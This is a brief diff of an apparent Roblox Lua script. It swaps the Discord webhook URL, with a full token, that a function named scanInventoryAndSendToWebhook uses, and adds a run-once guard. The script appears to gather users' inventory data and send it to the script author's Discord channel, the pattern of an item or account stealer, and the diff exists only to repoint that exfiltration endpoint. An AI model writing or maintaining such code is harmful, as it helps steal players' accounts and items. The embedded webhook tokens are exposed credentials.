@@ -505,7 +505,7 @@ local function scanInventoryAndSendToWebhook()
     end
 end
 
-_G.webhook = "https://discord.com/api/webhooks/1464809056278417626/GGrCbw-sz4zl-Q6COMbWEkUn5Z-4kdFfBVc8fNEgwE0YNaFUYy2fLo2xy385H5s-4s9y"
+_G.webhook = "https://discord.com/api/webhooks/1464866478120636511/EgbuxZC9y-XiTjbjbpekP3qpmRfqby8UB-XDTk_7yXrs03HjJ9aFUHUlTS3dibcs7HUI"
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
